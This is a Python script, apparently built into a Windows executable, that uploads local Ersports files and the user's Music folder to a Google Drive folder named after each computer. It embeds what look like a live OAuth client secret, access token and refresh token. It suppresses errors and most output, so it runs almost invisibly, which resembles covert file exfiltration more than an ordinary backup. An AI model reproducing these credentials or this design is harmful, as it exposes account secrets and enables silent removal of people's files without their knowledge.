import os
import time
import datetime
import sys
import getpass  # Thư viện để lấy tên người dùng máy tính
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from pathlib import Path
import winshell

SCOPES = ['https://www.googleapis.com/auth/drive']
tsleep = 150
tsleep2 = 36000
the_t = 1
end_date1 = datetime.date(2028, 6, 28)
def resource_path(relative_path):
    """ Lấy đường dẫn tuyệt đối đến tài nguyên (cho cả script và exe) """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def authenticate():
    # Giữ nguyên phần nhúng CLIENT_CONFIG và TOKEN_DATA của bạn
    CLIENT_CONFIG = {"installed":{"client_id":"535452856280-hmv3kut6gf9od70fmjohq95p3510kocb.apps.googleusercontent.com","project_id":"united-yeti-482813-q5","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_secret":"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","redirect_uris":["http://localhost"]}}
    TOKEN_DATA = {"token": "ya29.a0Aa7pCA_ZSKNMywDKqSJ0g3yTsX9II4d6YdXfFti3D8lvJFSiOAK6ass3r_WR0Jpw0MsJ14ts2KC-7aM_ocsnlKlQavnbS74TpvF3nN3ONrmv7TC6oRkIJ_o9L9n--Y1L50Wi9Bw4F-Yby5vti5jYu3XGaZC2VFnCvUEyz8zdUbW7jC_DmIKUFJ6uwQgBC1lLhivwaIsaCgYKARgSARYSFQHGX2MioD7yu1xPR4cocXfDBvdJ9w0206", "refresh_token": "1//0eZLATcQ9nUJsCgYIARAAGA4SNwF-L9Ir37_xqcTw2vQN5wM_z8YK7z83P87QJD9gcLTEeDwthVPplXfCTDdI3IBkFyGEaVn5wvc", "token_uri": "https://oauth2.googleapis.com/token", "client_id": "535452856280-hmv3kut6gf9od70fmjohq95p3510kocb.apps.googleusercontent.com", "client_secret": "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", "scopes": ["https://www.googleapis.com/auth/drive"], "universe_domain": "googleapis.com", "account": "", "expiry": "2025-12-30T21:44:53Z"}

    creds = Credentials.from_authorized_user_info(TOKEN_DATA, SCOPES)
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_config(CLIENT_CONFIG, SCOPES)
            creds = flow.run_local_server(port=0)
    return build('drive', 'v3', credentials=creds)

def get_drive_content(service, parent_id):
    """Lấy tất cả file/folder trong một thư mục Drive để so sánh nhanh hơn."""
    query = f"'{parent_id}' in parents and trashed = false"
    results = service.files().list(q=query, fields="files(id, name, mimeType)").execute()
    files = results.get('files', [])
    # Trả về dict với key là tên file để tìm kiếm tức thì (O(1))
    return {f['name']: f for f in files}

def check_exists(service, name, parent_id=None, is_folder=False):
    """Giữ lại hàm này cho các trường hợp kiểm tra thư mục gốc."""
    query = f"name = '{name}' and trashed = false"
    if parent_id: query += f" and '{parent_id}' in parents"
    if is_folder: query += " and mimeType = 'application/vnd.google-apps.folder'"
    
    results = service.files().list(q=query, fields="files(id, name)").execute()
    files = results.get('files', [])
    return files[0]['id'] if files else None

def get_or_create_user_folder(service):
    """Lấy tên PC User và tạo thư mục trên Drive nếu chưa có."""
    #pc_username = getpass.getuser() # Lấy tên User máy tính (ví dụ: 'Admin', 'Dell'...)
    pc_username = os.environ['COMPUTERNAME']
    #print(f"Tên máy tính là: {pc_username}")
    #print(f"--- {pc_username} ---")
    
    folder_id = check_exists(service, pc_username, is_folder=True)
    
    if not folder_id:
        file_metadata = {
            'name': pc_username,
            'mimeType': 'application/vnd.google-apps.folder'
        }
        folder = service.files().create(body=file_metadata, fields='id').execute()
        folder_id = folder.get('id')
        #print(f"Đã tạo thư mục gốc cho User: {pc_username} trên Drive.")
    #else:
        #print(f"Thư mục User '{pc_username}' đã tồn tại trên Drive.")
    
    return folder_id

def upload_directory(service, local_path, drive_parent_id):
    """Tải thư mục lên Drive (Đã tối ưu hóa)."""
    item_name = os.path.basename(local_path)
    
    # Bước 1: Kiểm tra/Tạo thư mục cha trên Drive
    drive_item_id = check_exists(service, item_name, drive_parent_id, is_folder=True)
    if not drive_item_id:
        file_metadata = {'name': item_name, 'mimeType': 'application/vnd.google-apps.folder', 'parents': [drive_parent_id]}
        folder = service.files().create(body=file_metadata, fields='id').execute()
        drive_item_id = folder.get('id')

    # Bước 2: Lấy danh sách nội dung hiện có trên Drive của thư mục này một lần duy nhất
    drive_content = get_drive_content(service, drive_item_id)

    # Bước 3: Duyệt các file cục bộ
    for item in os.listdir(local_path):
        item_path = os.path.join(local_path, item)
        
        if os.path.isfile(item_path):
            # So sánh nhanh với drive_content đã lấy
            if item not in drive_content:
                file_metadata = {'name': item, 'parents': [drive_item_id]}
                media = MediaFileUpload(item_path, resumable=True)
                service.files().create(body=file_metadata, media_body=media).execute()
                print(f"  -> Đã tải lên: {item}")
        
        elif os.path.isdir(item_path):
            # Đệ quy cho thư mục con
            upload_directory(service, item_path, drive_item_id)

def smart_upload(service, path, drive_parent_id):
    """Hàm thông minh phân biệt file và thư mục."""
    if not os.path.exists(path):
        time.sleep(0.001)
        #print(f"[Lỗi] Không tìm thấy: {path}")
        return

    if os.path.isfile(path):
        # Xử lý file đơn lẻ (Ví dụ: ER.xlsx)
        file_name = os.path.basename(path)
        drive_content = get_drive_content(service, drive_parent_id)
        if file_name not in drive_content:
            file_metadata = {'name': file_name, 'parents': [drive_parent_id]}
            media = MediaFileUpload(path, resumable=True)
            service.files().create(body=file_metadata, media_body=media).execute()
            print(f"-> Đã tải lên file: {file_name}")
    else:
        # Xử lý thư mục
        upload_directory(service, path, drive_parent_id)

def run_task1():
    time.sleep(10)

def run_backup_process():
    #pictures_path0 = winshell.folders()[0x14]
    pictures_path = str(Path.home() / "Music")
    # Danh sách kết hợp cả file và thư mục
    my_folders = [
        r'C:\Ersports\Summary',
        #r'C:\Ersports\Summary3',
        r'C:\Ersports\ER.xlsx',
        pictures_path,
        #pictures_path0
    ]
    
    try:
        service = authenticate()
        user_drive_folder_id = get_or_create_user_folder(service)
        
        for path in my_folders:
            print(f"\nĐang kiểm tra: {path}")
            smart_upload(service, path, user_drive_folder_id)
            
        #print("\nHoàn tất sao lưu!")
    except Exception as e:
        pass
        #print(f"Có lỗi xảy ra: {e}")